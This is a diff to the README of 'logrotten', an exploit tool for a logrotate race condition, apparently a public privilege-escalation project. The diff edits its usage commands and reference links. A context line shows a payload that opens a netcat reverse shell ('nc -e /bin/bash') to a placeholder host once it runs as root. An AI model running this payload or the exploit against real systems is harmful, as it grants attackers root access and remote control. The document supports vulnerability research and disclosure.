@@ -34,12 +34,12 @@ echo "if [ `id -u` -eq 0 ]; then (/bin/nc -e /bin/bash myhost 3333 &); fi" > pay
 
 If "create"-option is set in logrotate.cfg:
 ```
-nice -n -20 ./logrotten -p ./payloadfile /tmp/log/pwnme.log
+./logrotten -p ./payloadfile /tmp/log/pwnme.log
 ```
 
 If "compress"-option is set in logrotate.cfg:
 ```
-nice -n -20 ./logrotten -p ./payloadfile -c -s 4 /tmp/log/pwnme.log
+./logrotten -p ./payloadfile -c -s 4 /tmp/log/pwnme.log
 ```
 
 
@@ -54,8 +54,10 @@ nice -n -20 ./logrotten -p ./payloadfile -c -s 4 /tmp/log/pwnme.log
 ## Author
   - Wolfgang Hotwagner
 
-## Contact
+## References
   - https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition
   - https://tech.feedyourhead.at/content/abusing-a-race-condition-in-logrotate-to-elevate-privileges
   - https://github.com/whotwagner/logrotten
+  - https://www.ait.ac.at/themen/cyber-security/ait-sa-20190930-01/
+  - https://tech.feedyourhead.at/content/privilege-escalation-in-groonga-httpd
 
